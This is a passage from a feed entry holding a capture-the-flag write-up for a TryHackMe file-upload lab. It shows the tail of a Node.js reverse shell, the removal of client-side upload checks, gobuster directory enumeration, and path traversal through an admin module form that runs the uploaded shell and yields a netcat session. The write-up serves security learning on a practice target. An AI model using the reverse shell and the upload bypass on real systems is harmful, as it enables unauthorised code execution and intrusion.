+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>    sh.stderr.pipe(client);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>  });
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>  <span style="color:#cba6f7">return</span> <span style="color:#94e2d5">/a/</span>; <span style="color:#6c7086;font-style:italic">// Prevents the Node.js application form crashing
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span><span style="color:#6c7086;font-style:italic"></span>})();</span></span></code></pre></div>
+<br>
+<p>It seems like we can bypass three checks from the client-side: file size, magic number, and file extension. I am just going to delete all of the checks.
+<img src="image-32.png#center" alt="alt text"></p>
+<br>
+<p>Now the file upload has been successful.</p>
+<p><img src="image-27.png#center" alt="alt text">
+<br></p>
+<p>I&rsquo;ve already found the relative directories for image uploads by using the gobuster command that I&rsquo;ve been using for this room.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└─$ gobuster dir -u http://jewel.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Gobuster v3.6
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>by OJ Reeves <span style="color:#89dceb;font-weight:bold">(</span>@TheColonial<span style="color:#89dceb;font-weight:bold">)</span> &amp; Christian Mehlmauer <span style="color:#89dceb;font-weight:bold">(</span>@firefart<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Url:                     http://jewel.uploadvulns.thm
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Method:                  GET
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Threads:                 <span style="color:#fab387">10</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Negative Status codes:   <span style="color:#fab387">404</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> User Agent:              gobuster/3.6
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Timeout:                 <span style="color:#f5e0dc">10s</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>Starting gobuster in directory enumeration <span style="color:#f5e0dc">mode</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>/content              <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 181<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; /content/<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>/modules              <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 181<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; /modules/<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>/admin                <span style="color:#89dceb;font-weight:bold">(</span>Status: 200<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 1238<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>/assets               <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 179<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; /assets/<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>/Content              <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 181<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; /Content/<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>/Assets               <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 179<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; /Assets/<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>/Modules              <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 181<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; /Modules/<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>/Admin                <span style="color:#89dceb;font-weight:bold">(</span>Status: 200<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 1238<span style="color:#89dceb;font-weight:bold">]</span></span></span></code></pre></div>
+<br>
+<p>Navigating to other directories are not permitted except the <code>/admin</code>. Take a look at the text on the admin page: <code>As a reminder: use this form to activate modules from the /modules directory</code>. I already know that images are stored in <code>/content</code> not <code>/modules</code>. To access the images I uploaded on /content, I need to specify <code>../content/{the file of the image}.jpg</code> as we already saw in the gobuster output, both directories are in the same level.</p>
+<p><img src="image-33.png#center" alt="alt text"></p>
+<br>
+<p>Now, run another gobuster command against the <code>/content</code> directory with the wordlist provided plus <code>-x</code> command to look for jpg files.</p>
+<p><img src="image-35.png#center" alt="alt text"></p>
+<br>
+<p>As we can see, gobuster output changed our uploaded file name to <code>FNK.jpg</code> notice its size, it&rsquo;s realtively and small compared to to other files. Let&rsquo;s run our reverse-shell on the admin page.</p>
+<p><img src="image-34.png#center" alt="alt text"></p>
+<br>
+<p>the netcat successfully captured the reverse-shell. I was able to change directory to <code>/var/www</code> and capture the flag.</p>
+<p><img src="image-36.png#center" alt="alt text"></p>
 ]]></content:encoded>
     </item>
     <item>
